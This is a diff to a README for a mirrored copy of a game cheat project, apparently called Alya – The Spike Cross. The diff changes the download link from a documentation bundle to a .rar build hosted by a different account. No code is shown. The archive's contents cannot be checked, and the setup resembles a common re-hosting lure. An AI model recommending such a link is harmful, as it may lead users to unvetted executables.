@@ -3,7 +3,7 @@
 > **Mirrored copy.** Original source: <https://github.com/0xCiel/Alya-TheSpikeCross>
 > All credit to **0xCiel** and the Alya project — this repository does not own or maintain it.
 
-> **Download:** [Alya — The Spike Cross release](https://github.com/0xHasan97/project-cheats/releases/tag/alya-thespikecross-v1.0) — documentation folder bundle plus `SHA256SUMS.txt`.
+> **Download:** [Alya — The Spike Cross release](https://github.com/0xHasan97/project-cheats/releases/tag/alya-thespikecross-v1.0) — latest build [`Alya-TheSpikeCross-0.0.9.rar`](https://github.com/0xHasan97/project-cheats/releases/download/alya-thespikecross-v1.0/Alya-TheSpikeCross-0.0.9.rar) (upstream `0.0.9`), plus the documentation bundle and `SHA256SUMS.txt`.
 
 <p align="center"><img src="screenshots/banner.png" width="420"/></p>
 
